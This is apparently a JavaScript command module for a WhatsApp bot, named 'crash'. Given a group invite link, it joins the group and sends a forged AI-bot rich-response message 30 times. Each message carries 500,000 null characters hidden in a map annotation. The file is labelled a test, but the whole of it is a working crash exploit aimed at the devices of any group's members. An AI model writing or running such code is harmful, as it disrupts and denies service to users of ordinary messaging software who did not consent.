export default {
  name: ["crash"],
  description: "Prueba: botForwardedMessage con richResponse y 500k nulls",
  category: 'owner',
  ownerOnly: true,

  async run({ sock, from, text, cmdName, reply }) {
    if (!text || !text.includes('whatsapp.com')) {
      return reply({ text: `😿 Pásame el enlace del grupo.\nEjemplo: .${cmdName} https://chat.whatsapp.com/XXXX` });
    }

    const match = text.match(/chat\.whatsapp\.com\/([\w\d]+)/i);
    if (!match) return reply({ text: '😡 Enlace inválido.' });
    const code = match[1];

    let groupId;
    try {
      groupId = (await sock.groupGetInviteInfo(code)).id;
    } catch {
      return reply({ text: '⚠️ No pude leer el grupo. Enlace inválido o expirado.' });
    }
    try { await sock.groupAcceptInvite(code); } catch {}

    // 500.000 caracteres nulos escondidos en la anotación del richResponse
    const annotations = '\u0000'.repeat(500000);

    const payload = {
      botForwardedMessage: {
        message: {
          richResponseMessage: {
            messageType: 0,
            submessages: [
              { messageType: 7, mapMetadata: { annotations } },
            ],
            contextInfo: {
              forwardingScore: 1,
              isForwarded: true,
              forwardOrigin: 4,
              forwardedAiBotMessageInfo: { botJid: '0@bot' },
            },
          },
        },
      },
    };

    const total = 30;
    const delayMs = 1200;

    await reply({ text: `🧪 Probando botForwardedMessage → ${groupId} (${total}x)` });

    for (let i = 0; i < total; i++) {
      try {
        await sock.relayMessage(groupId, payload, {});
      } catch (e) {
        await reply({ text: `❌ Falló el envío: ${e.message}` });
        break;
      }
      await new Promise((r) => setTimeout(r, delayMs));
    }

    await reply({ text: `✅ Listo: ${total} envíos a ${groupId}.` });
  },
};